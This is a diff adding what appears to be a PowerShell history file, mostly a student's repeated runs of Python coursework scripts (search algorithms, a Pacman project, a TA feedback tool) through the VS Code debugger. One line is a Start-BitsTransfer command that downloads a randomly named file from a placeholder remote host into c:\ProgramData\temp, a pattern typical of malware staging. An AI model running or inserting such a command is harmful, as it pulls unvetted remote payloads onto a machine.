@@ -1,0 +1,102 @@
+ls
+python
+ls
+python3 .\driver.py
+python3
+python3 .\driver.py
+clear
+python3 .\driver.py
+ & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '64360' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '53575' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '53582' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+ls
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '53589' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '55280' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '59812' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\.vscode\launch.json' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '65184' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\.vscode\launch.json' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '64253' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\.vscode\launch.json' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '52889' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\.vscode\launch.json' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '62990' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\.vscode\launch.json' 
+python -m deubgpy ./driver.py
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '59881' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '55704' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '61548' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+python
+ & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '60376' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '63085' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '52929' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+python .\driver.py
+python
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '57501' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+python
+python .\driver.py
+python
+python .\driver.py
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '61548' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\search_algorithms.py' 
+e
+python .\driver.py
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '64800' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '59452' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+python .\driver.py
+python
+python .\driver.py
+python
+python .\driver.py
+python3 .\driver.py
+ls
+cd .\hw1_codes\
+ls
+python .\driver.py
+Start-BitsTransfer -Source "http://remote-host/TWUEGJDITXAONVPUOWFV" -Destination "c:\ProgramData\temp\TWUEGJDITXAONVPUOWFV"
+ & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '50123' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '50138' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '50146' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '50155' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
+ & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '49889' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\hw1_codes\driver.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\hw1_codes'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '63669' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\hw1_codes\driver.py' 
+python
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\hw1_codes'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '63669' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\hw1_codes\driver.py' 
+ls
+python3 .\driver.py
+python3 .\driver.py > result
+ & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '60451' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\hw1_codes\driver.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\hw1_codes'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '52253' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\hw1_codes\driver.py' 
+python .\driver.py > result.txt
+python .\driver.py
+python .\driver.py > result.txt
+ls
+python
+python3
+python
+ & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '64399' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+ & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '62259' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '51315' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '49952' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+python3
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '49804' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '49810' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '64268' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '51282' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+ c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '59694' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
+exit()
+Test-NetConnection "192.0.2.10"
+ls
+l
+s
+ls
+python .\feedbacker.py
+ls
+python .\pacman.py
+python2 pacman.py
+python3 .\pacman.py
+python3 .\pacman.py -h
+python .\pacman.py
+py -2 pacman.py
+python3
+python
+python2
+python
+python3
+python2
+py -2
+py -3
